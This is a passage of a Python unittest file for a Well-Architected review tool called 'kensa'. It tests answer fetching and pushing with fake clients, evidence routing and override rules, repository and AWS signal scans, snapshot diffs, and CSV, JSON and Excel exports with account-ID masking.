        self.assertTrue(all(r["status"] == "dry-run" for r in res))
        calls = []

        class C:
            def list_answers(self, **kw):
                return {"AnswerSummaries": []}

            def update_answer(self, **kw):
                calls.append(kw)
                if kw["QuestionId"] == "q2":
                    raise Fake("ValidationException", "boom")
        res = kensa_wa.push("w", self.items(), apply=True, c=C())
        self.assertEqual(sorted(r["status"] for r in res), ["error", "updated", "updated"])
        self.assertEqual(len(calls), 3)
        self.assertEqual(calls[0]["WorkloadId"], "w")

    def test_fetch_pagination_and_none_choice(self):
        pages = [{"AnswerSummaries": [{"QuestionId": "q1", "QuestionTitle": "T", "PillarId": "security", "Risk": "UNANSWERED",
                                       "Choices": [{"ChoiceId": "c1", "Title": "BP1", "Description": "D", "HelpfulResource": {"Url": "u"}},
                                                   {"ChoiceId": "q1_none", "Title": "None of these"}]}], "NextToken": "n"},
                 {"AnswerSummaries": [{"QuestionId": "q2", "QuestionTitle": "T2", "PillarId": "security", "Choices": [{"ChoiceId": "c2", "Title": "BP2"}]}]}]
        asked = []

        class C:
            def get_lens_review(self, **kw):
                return {"LensReview": {"LensVersion": "2025-02-25", "LensStatus": "CURRENT"}}

            def list_answers(self, **kw):
                asked.append(kw)
                return pages[1] if kw.get("NextToken") else pages[0]
        items, meta = kensa_wa.fetch("w", c=C())
        self.assertEqual([i["choice_id"] for i in items], ["c1", "c2"])
        self.assertEqual(meta["lens_version"], "2025-02-25")
        self.assertEqual(meta["lens_status"], "CURRENT")
        self.assertEqual(meta["none_choices"], {"q1": "q1_none"})
        self.assertEqual(items[0]["help_url"], "u")
        self.assertEqual(len(asked), 2)                                   # one paginated pass over every pillar, not one pass per known pillar
        self.assertTrue(all("PillarId" not in kw for kw in asked), asked)

    def test_fetch_reads_a_pillar_kensa_does_not_know_and_names_it_from_the_api(self):
        class C:
            def get_lens_review(self, **kw):
                return {"LensReview": {"LensVersion": "2027-01-01", "LensStatus": "CURRENT",
                                       "PillarReviewSummaries": [{"PillarId": "resilience", "PillarName": "Resilience"},
                                                                 {"PillarId": "security", "PillarName": "Sicherheit"}]}}

            def list_answers(self, **kw):
                return {"AnswerSummaries": [
                    {"QuestionId": "s1", "PillarId": "security", "Choices": [{"ChoiceId": "s1_a", "Title": "A"}]},
                    {"QuestionId": "r1", "PillarId": "resilience", "Choices": [{"ChoiceId": "r1_a", "Title": "B"}]},
                    {"QuestionId": "x1", "PillarId": "unlisted", "Choices": [{"ChoiceId": "x1_a", "Title": "C"}]}]}
        items, _ = kensa_wa.fetch("w", c=C())
        self.assertEqual({i["choice_id"]: i["pillar"] for i in items},
                         {"s1_a": "Security",          # a known pillar keeps kensa's stable name whatever language the API answers in
                          "r1_a": "Resilience",        # an unknown pillar takes the name the W-A Tool gives it
                          "x1_a": "unlisted"})         # and with no name at all, its id

    def test_fetch_returns_every_lens_status(self):
        for status in ("CURRENT", "NOT_CURRENT", "DEPRECATED", "DELETED", None):
            class C:
                def get_lens_review(self, **kw):
                    return {"LensReview": {"LensVersion": "v", **({"LensStatus": status} if status else {})}}

                def list_answers(self, **kw):
                    return {"AnswerSummaries": []}
            self.assertEqual(kensa_wa.fetch("w", c=C())[1]["lens_status"], status)

    def test_precheck(self):
        now = datetime.datetime(2026, 11, 1, tzinfo=datetime.timezone.utc)
        pdf = base64.b64encode(b"%PDF-" + b"x" * 100).decode()

        class C:
            def get_workload(self, **kw):
                return {"Workload": {"WorkloadName": "Acme Sample App - prod", "ReviewOwner": "Taro Yamada taro@example.com"}}

            def get_lens_review(self, **kw):
                return {"LensReview": {"UpdatedAt": now - datetime.timedelta(days=30), "PillarReviewSummaries": [
                    {"PillarId": "security", "RiskCounts": {"HIGH": 0, "UNANSWERED": 0}},
                    {"PillarId": "reliability", "RiskCounts": {"HIGH": 2}},
                    {"PillarId": "operationalExcellence", "RiskCounts": {"HIGH": 0}}]}}

            def get_lens_review_report(self, **kw):
                return {"LensReviewReport": {"Base64String": pdf}}
        r = {x["check"]: x["ok"] for x in kensa_wa.precheck("w", solution_name="Acme Sample App", c=C(), now=now)}
        self.assertTrue(r["workload name contains solution name"])
        self.assertTrue(r["review owner has name and email"])
        self.assertTrue(r["Security: HRI == 0"])
        self.assertFalse(r["Reliability: HRI == 0"])
        self.assertTrue(r["review updated within 1 year"])
        self.assertTrue(r["report PDF <= 3 MB"])


class RoutingInvariants(unittest.TestCase):
    def setUp(self):
        self.routing = read_json(os.path.join(ASSETS, "routing.json"))

    def test_every_route_is_well_formed(self):
        vocab = self.routing["vocab"]
        allowed = {"aws", "repo", "interview"}
        for cid, r in list(self.routing["choices"].items()) + list(self.routing["questions"].items()):
            self.assertTrue(set(r["ch"]) <= allowed, cid)
            self.assertEqual(r["ch"][-1], "interview" if "card" in r and r["card"] else r["ch"][-1], cid)
            for a in r["areas"]:
                self.assertIn(a, vocab["areas"], (cid, a))
            if r.get("draft"):
                self.assertTrue([c for c in r["ch"] if c != "interview"], cid)   # a draft needs some evidence route

    def test_tier_counts_on_bundled_routing(self):
        tiers = {"decide": 0, "draft": 0, "ask": 0}
        for r in self.routing["choices"].values():
            tiers[kensa.tier({"route": r})] += 1
        self.assertGreater(tiers["draft"], 30)       # the formerly interview-only items that now carry evidence routes
        self.assertEqual(sum(tiers.values()), len(self.routing["choices"]))


class DraftEvidence(Flow):
    OBJ = "rel_planning_for_recovery_objective_defined_recovery"

    def apply(self, entries, *flags):
        f = os.path.join(self.tmp.name, "e.json")
        write_json(entries, f)
        return run(["apply", f, *flags], self.d)

    def test_absence_is_not_evidence_on_a_draft_route(self):
        # not finding something is not evidence: ✗ from a draft route's repo/aws scan is refused (only --force records it)
        code, _, err = self.apply([{"choice_id": "ops_ops_model_def_proc_owners", "verdict": "✗", "channel": "repo", "confidence": "M"}])
        self.assertIsNone(self.item("ops_ops_model_def_proc_owners")["verdict"])
        self.assertIn("not finding", err)
        self.apply([{"choice_id": "ops_ops_model_def_proc_owners", "verdict": "✗", "channel": "repo", "confidence": "M"}], "--force")
        self.assertEqual(self.item("ops_ops_model_def_proc_owners")["verdict"], "✗")

    def test_slack_drive_search_is_not_a_channel(self):
        # Slack / Drive search is not a feature: it is neither a source nor a subcommand
        code, _, err = self.apply([{"choice_id": self.OBJ, "verdict": "○", "channel": "collab", "confidence": "M"}])
        self.assertNotEqual(code, 0)
        self.assertIsNone(self.item(self.OBJ)["verdict"])
        self.assertNotEqual(run(["collab", "plan"], self.d)[0], 0)

    def test_draft_evidence_is_shown_on_the_card_and_a_person_can_override_it(self):
        run(["plan", "--skip", "repo,aws"], self.d)
        self.apply([{"choice_id": "ops_ops_model_def_proc_owners", "verdict": "○", "channel": "repo", "confidence": "M",
                     "evidence": "CODEOWNERS present"}])
        _, out, _ = run(["cards", "show", "C-OPS-OWNERSHIP"], self.d)
        self.assertIn("Detected evidence", out)
        self.assertIn("CODEOWNERS present", out)
        # draft: AWS/repo evidence does not lock the item the way a decisive check does
        self.assertFalse(kensa.settled_by_evidence(self.item("ops_ops_model_def_proc_owners")))
        run(["cards", "answer", "C-OPS-OWNERSHIP", "--current", "partial"], self.d)
        it = self.item("ops_ops_model_def_proc_owners")
        self.assertEqual((it["verdict"], it["channel"]), ("△", "interview"))

    def test_rescan_does_not_overwrite_a_persons_answer_on_a_draft_route(self):
        cid = "ops_ops_model_def_proc_owners"
        run(["plan", "--skip", "repo,aws"], self.d)
        self.apply([{"choice_id": cid, "verdict": "○", "channel": "repo", "confidence": "M", "evidence": "CODEOWNERS present"}])
        run(["cards", "answer", "C-OPS-OWNERSHIP", "--current", "none"], self.d)
        it = self.item(cid)
        self.assertEqual((it["verdict"], it["channel"]), ("✗", "interview"))
        # A rescan's draft evidence (existence only) does not overwrite an answer a person confirmed
        code, _, err = self.apply([{"choice_id": cid, "verdict": "○", "channel": "repo", "confidence": "H", "evidence": "CODEOWNERS present"}])
        self.assertIn("person's answer", err)
        it = self.item(cid)
        self.assertEqual((it["verdict"], it["channel"]), ("✗", "interview"))
        self.apply([{"choice_id": cid, "verdict": "○", "channel": "repo", "confidence": "H"}], "--force")
        self.assertEqual(self.item(cid)["channel"], "repo")

    def test_draft_evidence_still_replaces_imported_and_older_drafts(self):
        cid = "ops_ops_model_def_proc_owners"
        self.apply([{"choice_id": cid, "verdict": "✗", "channel": "imported", "confidence": "L"}])
        self.apply([{"choice_id": cid, "verdict": "○", "channel": "repo", "confidence": "M", "evidence": "CODEOWNERS present"}])
        self.assertEqual((self.item(cid)["verdict"], self.item(cid)["channel"]), ("○", "repo"))
        self.apply([{"choice_id": cid, "verdict": "△", "channel": "repo", "confidence": "H", "evidence": "CODEOWNERS (partial)"}])
        self.assertEqual(self.item(cid)["verdict"], "△")

    def test_decisive_evidence_still_overrides_a_persons_answer(self):
        # A route that is not a draft (such as an AWS setting) is still stronger than a self-reported answer, as before
        cid = "sec_protect_data_rest_encrypt"
        self.apply([{"choice_id": cid, "verdict": "✗", "channel": "interview", "confidence": "M"}])
        self.apply([{"choice_id": cid, "verdict": "○", "channel": "aws", "confidence": "H", "evidence": "StorageEncrypted=true"}])
        self.assertEqual((self.item(cid)["verdict"], self.item(cid)["channel"]), ("○", "aws"))

    def test_finalize_keeps_drafts_and_flags_them(self):
        self.apply([{"choice_id": self.OBJ, "verdict": "○", "channel": "repo", "confidence": "M", "evidence": "docs/dr.md present"}])
        run(["finalize", "--allow-empty"], self.d)
        it = self.item(self.OBJ)
        self.assertEqual((it["verdict"], it["channel"], it["status"]), ("○", "repo", "needs_review"))
        for lang, tier_label, source in (("ja", "【下書き】", "リポジトリ"), ("en", "[Draft]", "Repository / IaC")):
            out = os.path.join(self.tmp.name, f"o-{lang}.csv")
            run(["export", "--format", "csv", "--out", out], self.d, lang=lang)
            row = [r for r in csv.reader(io.StringIO(read_text(out, "utf-8-sig"))) if self.OBJ in r][0]
            self.assertIn(tier_label, row[17])
            self.assertIn(source, row[8])

    def test_coverage_counts_tiers(self):
        code, out, _ = run(["coverage", "--all", "--json"], self.d)
        c = json.loads(out)
        self.assertEqual(c["decide"] + c["draft"] + c["ask"], c["total"])
        self.assertEqual(c["total"], 12)
        self.assertGreaterEqual(c["draft"], 2)
        code, out, _ = run(["coverage", "--all"], self.d)
        self.assertIn("draft", out)


class GenericLens(unittest.TestCase):
    """Another lens / a new framework version: unknown items are classified by the agent and registered as an overlay."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.d = os.path.join(self.tmp.name, ".kensa")
        rows = list(csv.reader(io.StringIO(read_text(FIXTURE, "utf-8-sig"))))
        rows.append(["Serverless", "sl-q1", "How do you handle function timeouts?", "sl_timeouts_tuned", "Tune function timeouts", "desc", "No"] + [""] * (len(rows[0]) - 7))
        rows.append(["Serverless", "sl-q2", "How do you review designs?", "sl_design_review", "Review designs", "desc", "No"] + [""] * (len(rows[0]) - 7))
        self.csv = os.path.join(self.tmp.name, "lens.csv")
        with open(self.csv, "w", encoding="utf-8", newline="") as f:
            csv.writer(f).writerows(rows)
        run(["init"], self.d)
        self.seed = run(["seed", "--from-csv", self.csv], self.d)
        self.bundled = read_text(os.path.join(ASSETS, "routing.json"))

    def tearDown(self):
        self.tmp.cleanup()

    def work(self):
        return read_json(os.path.join(self.d, "worklist.json"))

    def test_unknown_items_are_listed_with_a_rubric(self):
        self.assertIn("route-unknown", self.seed[1])
        code, out, _ = run(["route-unknown"], self.d)
        o = json.loads(out)
        self.assertEqual({i["choice_id"] for i in o["items"]}, {"sl_timeouts_tuned", "sl_design_review"})
        self.assertIn("areas", o["vocab"])
        self.assertTrue(any(c["id"] == "C-ARCH-REVIEW" for c in o["cards"]))
        self.assertIn("interview", o["how_to"])

    def test_route_apply_registers_an_overlay_and_leaves_the_bundle_alone(self):
        f = os.path.join(self.tmp.name, "r.json")
        write_json({"choices": {
            "sl_timeouts_tuned": {"ch": ["aws"], "areas": ["compute"]},
            "sl_design_review": {"ch": ["repo"], "areas": ["docs"], "draft": True, "card": "C-ARCH-REVIEW"}}}, f)
        code, out, err = run(["route-apply", f], self.d)
        self.assertEqual(code, 0, err)
        w = {i["choice_id"]: i for i in self.work()["items"]}
        self.assertEqual(w["sl_timeouts_tuned"]["route"]["ch"], ["aws", "interview"])     # interview is always the last resort
        r = w["sl_design_review"]["route"]
        self.assertEqual((r["ch"], r["draft"], r["card"], r["known"]), (["repo", "interview"], True, "C-ARCH-REVIEW", "choice"))
        self.assertTrue(os.path.exists(os.path.join(self.d, "routing.local.json")))
        self.assertEqual(read_text(os.path.join(ASSETS, "routing.json")), self.bundled)
        # the overlay survives a re-seed (e.g. when the lens is refreshed)
        run(["seed", "--from-csv", self.csv], self.d)
        self.assertEqual({i["choice_id"]: i for i in self.work()["items"]}["sl_design_review"]["route"]["known"], "choice")
        code, out, _ = run(["route-unknown"], self.d)
        self.assertEqual(json.loads(out)["count"], 0)

    def test_route_apply_rejects_bad_input(self):
        f = os.path.join(self.tmp.name, "r.json")
        write_json({"choices": {"sl_design_review": {"ch": ["slack"]}}}, f)
        self.assertNotEqual(run(["route-apply", f], self.d)[0], 0)
        write_json({"choices": {"sl_design_review": {"ch": ["repo"], "card": "C-NOPE"}}}, f)
        self.assertNotEqual(run(["route-apply", f], self.d)[0], 0)
        write_json({"choices": {"sl_design_review": {"ch": ["collab"]}}}, f)   # Slack / Drive search is not a route
        self.assertNotEqual(run(["route-apply", f], self.d)[0], 0)
        write_json({"choices": {"sl_design_review": {"ch": ["repo"], "areas": ["no-such-area"]}}}, f)
        code, out, _ = run(["route-apply", f], self.d)
        self.assertEqual(code, 0)
        self.assertIn("warn", out)

    def test_cards_overlay_lets_an_organisation_change_recommendations(self):
        base = read_json(os.path.join(ASSETS, "cards.json"))
        rec = next(c for c in base["cards"] if c["id"] == "C-OPS-OWNERSHIP")["recommend"]
        write_json({"cards": {"C-OPS-OWNERSHIP": {"recommend": dict(rec, label="A dedicated SRE keeps the on-call schedule")}}}, os.path.join(self.d, "cards.local.json"))
        _, out, _ = run(["cards", "show", "C-OPS-OWNERSHIP"], self.d)
        self.assertIn("A dedicated SRE keeps the on-call schedule", out)
        self.assertEqual(read_json(os.path.join(ASSETS, "cards.json")), base)


class NewSignals(unittest.TestCase):
    def test_doc_and_ownership_signals_are_presence_only_and_word_bounded(self):
        with tempfile.TemporaryDirectory() as t:
            def w(rel, txt=""):
                p = os.path.join(t, rel)
                os.makedirs(os.path.dirname(p), exist_ok=True)
                with open(p, "w", encoding="utf-8") as fh:
                    fh.write(txt)
            for f in ("docs/slo.md", "docs/orr-checklist.md", "docs/retro/2026-q1.md", "docs/data-classification.md",
                      "docs/error-handling.md", "docs/mirror-setup.md", "docs/training/security.md", "catalog-info.yaml",
                      ".github/ISSUE_TEMPLATE/incident.md", ".github/ISSUE_TEMPLATE/change.md"):
                w(f, "# x")
            w("infra/dash.tf", 'resource "aws_cloudwatch_dashboard" "d" {}\nresource "aws_fis_experiment_template" "x" {}\n')
            w(".github/workflows/c.yml", "jobs:\n  a:\n    steps:\n      - uses: infracost/actions/setup@v3\n      - uses: zaproxy/action-baseline@v0.12.0\n")
            r = kensa_scan.scan_repo(t)["signals"]
            d = r["docs"]
            self.assertTrue(d["slo"] and d["readiness_review"] and d["retrospective"] and d["data_classification"] and d["training"])
            self.assertEqual([f for f in d["readiness_review"] if "error" in f or "mirror" in f], [])   # "orr" must not match "error"/"mirror"
            self.assertFalse(d["gameday"] or d["pentest"] or d["sustainability"])                       # absent stays empty (never a ✗ by itself)
            self.assertEqual(r["ownership"]["issue_templates"], 2)
            self.assertEqual(r["ownership"]["service_catalog"], ["catalog-info.yaml"])
            self.assertTrue(r["iac_resources"]["dashboards"] and r["iac_resources"]["fis_templates"])
            self.assertFalse(r["iac_resources"]["budgets"])
            self.assertTrue(r["ci"]["cost_estimate_in_ci"] and r["ci"]["dast_in_ci"])
            self.assertFalse(r["ci"]["chaos_in_ci"])

    def test_github_activity_counts_only_and_get_only(self):
        calls = []
        now = datetime.datetime.now(datetime.timezone.utc)
        recent = (now - datetime.timedelta(days=5)).strftime("%Y-%m-%dT%H:%M:%SZ")
        old = (now - datetime.timedelta(days=400)).strftime("%Y-%m-%dT%H:%M:%SZ")

        class P:
            def __init__(self, out):
                self.stdout, self.returncode, self.stderr = json.dumps(out), 0, ""

        def runner(cmd, **kw):
            calls.append(cmd)
            ep = cmd[2]
            if ep.startswith("repos/o/r/releases"):
                return P([{"published_at": recent}, {"published_at": old}])
            if ep.startswith("repos/o/r/deployments"):
                return P([{"created_at": recent, "environment": "production"}, {"created_at": old, "environment": "staging"}])
            if ep.startswith("repos/o/r/pulls"):
                return P([{"merged_at": recent, "user": {"login": "dependabot[bot]"}}, {"merged_at": recent, "user": {"login": "alice"}}, {"merged_at": None}])
            if ep.startswith("repos/o/r/labels"):
                return P([{"name": "incident"}, {"name": "sev-1"}, {"name": "postmortem"}, {"name": "tech-debt"}, {"name": "feature"}])
            if ep.startswith("repos/o/r/issues"):
                return P([{"title": "SECRET TITLE"}, {"title": "pr", "pull_request": {}}])
            if ep.startswith("repos/o/r/community"):
                return P({"files": {"contributing": {"url": "x"}, "issue_template": None, "pull_request_template": {"url": "y"}}})
            return P({"default_branch": "main"})
        a = kensa_scan.scan_github_activity("o/r", runner)
        self.assertEqual((a["releases_in_window"], a["deployments_in_window"], a["merged_prs_in_window"], a["dependency_bot_prs_in_window"]), (1, 1, 2, 1))
        self.assertEqual(a["deployment_environments"], ["production"])
        self.assertEqual(a["labels"], {"incident": 2, "postmortem": 1, "improvement": 1, "priority": 1})
        self.assertEqual(a["issues_postmortem_in_window"], 1)           # the PR entry is not counted as an issue
        self.assertEqual(a["community"], {"contributing": True, "issue_template": False, "pull_request_template": True, "code_of_conduct": False})
        self.assertNotIn("SECRET TITLE", json.dumps(a))                 # titles/bodies/people are never stored
        for c in calls:
            self.assertEqual(c[:2], ["gh", "api"])
            self.assertNotIn("-X", c)

    def test_new_aws_checks(self):
        now = datetime.datetime.now(datetime.timezone.utc)
        t = {
            ("sts", "get_caller_identity"): {"Account": "123456789012", "Arn": "arn:aws:iam::123456789012:role/ReadOnly"},
            ("resiliencehub", "list_resiliency_policies"): {"resiliencyPolicies": [
                {"policy": {"AZ": {"rtoInSecs": 3600, "rpoInSecs": 600}, "Region": {"rtoInSecs": 86400, "rpoInSecs": 3600}}}, {"policy": {}}]},
            ("resiliencehub", "list_apps"): {"appSummaries": [{}]},
            ("fis", "list_experiment_templates"): {"experimentTemplates": [{}, {}]},
            ("fis", "list_experiments"): {"experiments": [{"creationTime": now - datetime.timedelta(days=10)}, {"creationTime": now - datetime.timedelta(days=200)},
                                                          {"creationTime": now - datetime.timedelta(days=900)}]},
            ("ssm-contacts", "list_contacts"): {"Contacts": [{"Type": "PERSONAL", "DisplayName": "NAME"}, {"Type": "ESCALATION"}, {"Type": "ONCALL_SCHEDULE"}]},
            ("ssm-incidents", "list_incident_records"): {"incidentRecordSummaries": [{"creationTime": now - datetime.timedelta(days=30), "status": "RESOLVED", "title": "SECRET"}]},
            ("ssm", "describe_ops_items"): {"OpsItemSummaries": [{"Severity": "2", "Priority": 3, "CreatedTime": now - datetime.timedelta(days=3)}, {"CreatedTime": now - datetime.timedelta(days=300)}]},
            ("ssm", "list_documents"): {"DocumentIdentifiers": [{}]},
            ("application-signals", "list_service_level_objectives"): {"SloSummaries": [{}, {}, {}]},
        }
        res = kensa_scan.run_aws_scan(FakeSession(t), ["ap-northeast-1"], only={"resilience", "ops_process", "slo"})["checks"]
        r = res["resilience"]["regions"]["ap-northeast-1"]["data"]
        self.assertEqual(r["resiliency_policies"], {"total": 2, "with_rto_rpo": 1})
        self.assertEqual(r["fis_templates"], 2)
        self.assertEqual(r["fis_experiments"], {"total": 3, "last_365d": 2, "last_90d": 1})
        o = res["ops_process"]["regions"]["ap-northeast-1"]["data"]
        self.assertEqual(o["ssm_contacts"], {"total": 3, "escalation_plans": 1, "oncall_schedules": 1})
        self.assertEqual(o["incident_records"], {"total": 1, "last_365d": 1, "resolved": 1})
        self.assertEqual(o["ops_items"], {"sampled": 2, "with_severity": 1, "with_priority": 1, "last_90d": 1})
        self.assertEqual(o["change_templates"], 1)
        self.assertEqual(res["slo"]["regions"]["ap-northeast-1"]["data"]["service_level_objectives"], 3)
        self.assertNotIn("SECRET", json.dumps(res))
        self.assertNotIn("NAME", json.dumps(res))

    def test_one_missing_service_does_not_hide_the_others(self):
        t = {("sts", "get_caller_identity"): {"Account": "123456789012", "Arn": "arn:aws:iam::123456789012:role/x"},
             ("resiliencehub", "list_resiliency_policies"): Fake("AccessDeniedException"),
             ("fis", "list_experiment_templates"): {"experimentTemplates": [{}]}}
        r = kensa_scan.run_aws_scan(FakeSession(t), ["ap-northeast-1"], only={"resilience"})["checks"]["resilience"]["regions"]["ap-northeast-1"]["data"]
        self.assertEqual(r["resiliency_policies"], "denied")
        self.assertEqual(r["fis_templates"], 1)


ENC = "sec_protect_data_rest_encrypt"
IDM = "sec_identities_enforce_mechanisms"
OWN = "ops_ops_model_def_proc_owners"


class Seeded(unittest.TestCase):
    """A working directory that has only seeded the 12 items (a base so tests need not inherit from Flow)."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.d = os.path.join(self.tmp.name, ".kensa")
        run(["init"], self.d)
        code, out, _ = run(["seed", "--from-csv", FIXTURE], self.d)
        self.assertEqual(code, 0, out)

    def tearDown(self):
        self.tmp.cleanup()

    def work(self):
        return read_json(os.path.join(self.d, "worklist.json"))

    def save_work(self, w):
        write_json(w, os.path.join(self.d, "worklist.json"))

    def item(self, cid):
        return next(i for i in self.work()["items"] if i["choice_id"] == cid)

    def apply(self, *entries, force=False):
        f = os.path.join(self.tmp.name, "apply.json")
        write_json(list(entries), f)
        return run(["apply", f] + (["--force"] if force else []), self.d)


def aws(cid, verdict, **kw):
    return dict({"choice_id": cid, "verdict": verdict, "channel": "aws", "confidence": "H", "evidence": "e"}, **kw)


class ReReview(Seeded):
    def test_apply_records_evidence_time_and_action_fields(self):
        code, out, _ = self.apply(aws(OWN, "△", channel="interview", confidence="M", due="2026-12-31", action_status="doing"))
        self.assertEqual(code, 0, out)
        it = self.item(OWN)
        self.assertEqual((it["due"], it["action_status"]), ("2026-12-31", "doing"))
        self.assertIsNotNone(datetime.datetime.fromisoformat(it["evidence_at"]))
        self.assertNotIn("evidence_at", self.item(ENC))   # an item that was not touched gets none

    def test_apply_rejects_bad_due_and_status_without_saving_anything(self):
        for bad in ({"due": "next month"}, {"due": "2026-13-40"}, {"action_status": "finished"}):
            code, _, err = self.apply(aws(ENC, "○"), aws(OWN, "△", channel="interview", **bad))
            self.assertNotEqual(code, 0, bad)
        self.assertIsNone(self.item(ENC)["verdict"])

    def test_card_answer_records_evidence_time(self):
        run(["cards", "answer", "C-OPS-OWNERSHIP", "--current", "partial"], self.d)
        self.assertIn("evidence_at", self.item(OWN))

    def test_snapshot_and_diff_separate_regression_improvement_and_confirmation(self):
        self.apply(aws(ENC, "○"))
        run(["finalize", "--allow-empty"], self.d)
        code, out, _ = run(["snapshot", "--label", "2026 Q1"], self.d)
        self.assertEqual(code, 0, out)
        names = os.listdir(os.path.join(self.d, "history"))
        self.assertEqual(len(names), 1)
        self.assertTrue(names[0].endswith("-2026-Q1.json"), names)
        self.assertEqual(read_json(os.path.join(self.d, "history", names[0]))["label"], "2026 Q1")
        # ENC goes ○→△ (regressed); IDM goes from assumed ✗ to ○ (improved and newly confirmed)
        self.apply(aws(ENC, "△"), aws(IDM, "○"))
        code, out, _ = run(["diff", "--json"], self.d)
        self.assertEqual(code, 0, out)
        d = json.loads(out)
        self.assertEqual([(r["choice_id"], r["from"], r["to"]) for r in d["regressed"]], [(ENC, "○", "△")])
        self.assertEqual([(r["choice_id"], r["from"], r["to"]) for r in d["improved"]], [(IDM, "✗", "○")])
        self.assertEqual([r["choice_id"] for r in d["confirmed"]], [IDM])
        self.assertEqual((d["added"], d["removed"]), ([], []))
        code, out, _ = run(["diff"], self.d)
        self.assertIn("Regressed (needs action)", out)
        self.assertIn(ENC, out)

    def test_diff_without_or_with_ambiguous_snapshot_fails(self):
        code, _, err = run(["diff"], self.d)
        self.assertNotEqual(code, 0)
        self.assertIn("snapshot", err)
        run(["snapshot", "--label", "a"], self.d)
        hist = os.path.join(self.d, "history")
        write_json({"items": {}}, os.path.join(hist, "20200101-000000-a.json"))
        code, _, err = run(["diff", "--since=-a"], self.d)
        self.assertNotEqual(code, 0)
        self.assertIn("unique", err)

    def test_diff_reports_lens_changes(self):
        run(["snapshot"], self.d)
        w = self.work()
        for i in w["items"]:
            if i["choice_id"] == ENC:
                i["removed"] = True
        w["items"].append(dict(next(i for i in w["items"] if i["choice_id"] == IDM), choice_id="sec_brand_new", status="new_in_lens", verdict=None, channel=None))
        self.save_work(w)
        d = json.loads(run(["diff", "--json"], self.d)[1])
        self.assertEqual([r["choice_id"] for r in d["removed"]], [ENC])
        self.assertEqual([r["choice_id"] for r in d["added"]], ["sec_brand_new"])

    @needs_openpyxl
    def test_stale_evidence_is_flagged_in_status_diff_and_openitems(self):
        self.apply(aws(ENC, "○"))
        self.apply(aws(IDM, "○"))
        w = self.work()
        old = (datetime.datetime.now().astimezone() - datetime.timedelta(days=200)).isoformat(timespec="seconds")
        for i in w["items"]:
            if i["choice_id"] == ENC:
                i["evidence_at"] = old
        self.save_work(w)
        run(["snapshot"], self.d)
        self.assertIn("older than 180 days: 1", run(["status"], self.d)[1])
        d = json.loads(run(["diff", "--json"], self.d)[1])
        self.assertEqual([r["choice_id"] for r in d["stale"]], [ENC])
        self.assertEqual(json.loads(run(["diff", "--json", "--stale-days", "300"], self.d)[1])["stale"], [])
        run(["finalize", "--allow-empty"], self.d)
        x = os.path.join(self.tmp.name, "o.xlsx")
        self.assertEqual(run(["export", "--out", x], self.d)[0], 0)
        from openpyxl import load_workbook
        rows = {r[1].value: r[6].value for r in load_workbook(x)["OpenItems"].iter_rows(min_row=2)}
        self.assertIn("days since the evidence was recorded", rows[ENC])
        self.assertNotIn(IDM, rows)

    @needs_openpyxl
    def test_checklist_has_a_confirmation_date_column(self):
        self.apply(aws(ENC, "○"))
        run(["finalize", "--allow-empty"], self.d)
        from openpyxl import load_workbook
        for lang in ("en", "ja"):
            x = os.path.join(self.tmp.name, f"o-{lang}.xlsx")
            run(["export", "--out", x], self.d, lang=lang)
            ws = load_workbook(x)["Checklist"]
            self.assertEqual(ws[1][-1].value, i18n.labels(lang)["cols"][-1])    # "Confirmed on" / "確認日"
            by = {r[3].value: r[-1].value for r in ws.iter_rows(min_row=2)}
            self.assertEqual(by[ENC], datetime.date.today().isoformat())
            self.assertIn(by[IDM], ("", None))   # an assumed item has no confirmation date


class OutputEnhancements(Seeded):
    def test_export_json_shape_and_masking(self):
        self.apply(aws(ENC, "○", evidence="account 123456789012 ok"))
        run(["context", "set", "aws.account_ids=[\"123456789012\"]", "service.name=svc"], self.d)
        run(["finalize", "--allow-empty"], self.d)
        out = os.path.join(self.tmp.name, "o.json")
        code, msg, _ = run(["export", "--format", "json", "--mask-account-ids", "--out", out], self.d)
        self.assertEqual(code, 0, msg)
        text = read_text(out)
        self.assertNotIn("123456789012", text)
        doc = json.loads(text)
        self.assertEqual(len(doc["items"]), 12)
        self.assertEqual(doc["rates"]["total"], 12)
        self.assertNotIn("answers", doc["context"])
        it = next(i for i in doc["items"] if i["choice_id"] == ENC)
        self.assertEqual((it["verdict"], it["channel"], it["confidence"]), ("○", "aws", "H"))
        self.assertEqual(it["route"]["tier"], "decide")
        self.assertIn("due", it)
        unmasked = os.path.join(self.tmp.name, "u.json")
        run(["export", "--format", "json", "--out", unmasked], self.d)
        self.assertIn("123456789012", read_text(unmasked))

    def test_rates_separate_recorded_from_confirmed(self):
        self.apply(aws(ENC, "○"))
        self.assertEqual(kensa.rates(kensa.active(self.work())), {"total": 12, "recorded": 1, "confirmed": 1, "recorded_rate": 0.083, "confirmed_rate": 0.083})
        run(["finalize", "--allow-empty"], self.d)
        r = kensa.rates(kensa.active(self.work()))
        self.assertEqual((r["recorded"], r["confirmed"]), (12, 1))   # an assumed item is recorded but not confirmed
        self.assertIn("confirmed (excl. assumed and undetermined) 1/12", run(["status"], self.d)[1])

    @needs_openpyxl
    def test_summary_rate_columns_and_actionplan_status(self):
        run(["cards", "answer", "C-OPS-OWNERSHIP", "--current", "partial"], self.d)
        self.apply(aws(OWN, "△", channel="interview", confidence="M", due="2026-12-31", action_status="doing"))
        run(["finalize", "--allow-empty"], self.d)
        from openpyxl import load_workbook
        for lang in ("en", "ja"):
            t = i18n.labels(lang)
            x = os.path.join(self.tmp.name, f"o-{lang}.xlsx")
            self.assertEqual(run(["export", "--out", x], self.d, lang=lang)[0], 0)
            wb = load_workbook(x)
            hdr = [c.value for c in wb["Summary"][4]]
            self.assertEqual(hdr, t["sum_hdr"])
            last = max(r[0].row for r in wb["Summary"].iter_rows(min_row=5) if r[0].value == t["sum_total"])
            self.assertTrue(str(wb["Summary"].cell(row=last, column=13).value).startswith("=IF("))
            self.assertTrue(str(wb["Summary"].cell(row=5, column=14).value).startswith("=IF("))
            wa = wb["ActionPlan"]
            self.assertEqual([c.value for c in wa[1]], t["ap_hdr"])
            rows = {r[3].value: (r[11].value, r[12].value) for r in wa.iter_rows(min_row=2)}
            self.assertEqual(rows[OWN], ("2026-12-31", t["status"]["doing"]))
            self.assertEqual({v[1] for k, v in rows.items() if k != OWN}, {t["status"]["todo"]})
            self.assertTrue(wa.data_validations.dataValidation)
            self.assertEqual(wa.data_validations.dataValidation[0].formula1, '"' + ",".join(t["status"].values()) + '"')
        self.assertEqual(self.item(OWN)["action_status"], "doing")      # stored as a code, whatever the export language

    def test_push_warns_about_assumed_and_can_exclude_them(self):
